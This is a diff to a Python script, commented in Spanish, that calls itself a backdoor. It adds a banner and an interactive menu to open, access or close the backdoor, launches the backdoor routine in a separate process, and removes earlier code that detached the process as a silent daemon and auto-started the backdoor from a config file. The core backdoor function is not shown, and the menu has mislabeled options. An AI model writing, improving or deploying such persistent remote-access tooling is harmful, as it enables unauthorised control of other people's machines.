@@ -1,3 +1,4 @@
+import multiprocessing
 import socket
 import subprocess
 import os
@@ -45,33 +46,53 @@ def cerrar_backdoor():
     else:
         print("La backdoor ya está cerrada.")
 
+def banner():
+    cartel = r"""
+     ___          _      _              
+    | _ ) __ _ __| |____| |___  ___ _ _ 
+    | _ \/ _` / _| / / _` / _ \/ _ \ '_|
+    |___/\__,_\__|_\_\__,_\___/\___/_|  
+                                     
+    """
+    print(cartel)
+
 if __name__ == '__main__':
     try:
-        pid = os.fork()
-        if pid > 0:
-            sys.exit(0)
+        multiprocessing.set_start_method('spawn')
+        p = multiprocessing.Process(target=backdoor)
+        p.start()
+
+        while True:
+
+            banner()
+
+            print("*******************************")
+            print("*            MENU             *")
+            print("*******************************")
+            print("*     1. ABRIR BACKDOOR       *")
+            print("*                             *")
+            print("*     2. ACCEDER A BACKDOOR   *")
+            print("*                             *")
+            print("*     2. CERRAR BACKDOOR      *")
+            print("*******************************")
+            
+            opcion = input("Seleccione el tipo de conexión (1, 2 o 3): ").strip()
+            
+            if opcion == "1":
+                abrir_backdoor()
+                break
+            elif opcion == "2":
+                if os.path.exists("config.txt"):
+                    backdoor()
+                else:
+                    print("La backdoor no está abierta.")
+            elif opcion == "3":
+                cerrar_backdoor()
+                break
+            else:
+                print("Opción inválida. Intenta de nuevo.")
+
+        p.join()
     except OSError as e:
         print(f"Error al crear el demonio: {e}")
         sys.exit(1)
-
-    os.chdir("/")
-    os.setsid()
-    sys.stdin.close()
-    sys.stdout.close()
-    sys.stderr.close()
-    sys.stdin = open(os.devnull, 'r')
-    sys.stdout = open(os.devnull, 'w')
-    sys.stderr = open(os.devnull, 'w')
-
-    if os.path.exists("config.txt"):
-        with open("config.txt", "r") as f:
-            estado = f.read()
-        if estado == "abierta":
-            backdoor()
-    else:
-        respuesta = input("¿Deseas abrir la backdoor? (s/n): ")
-        if respuesta.lower() == "s":
-            abrir_backdoor()
-            backdoor()
-        else:
-            print("Backdoor no abierta.")
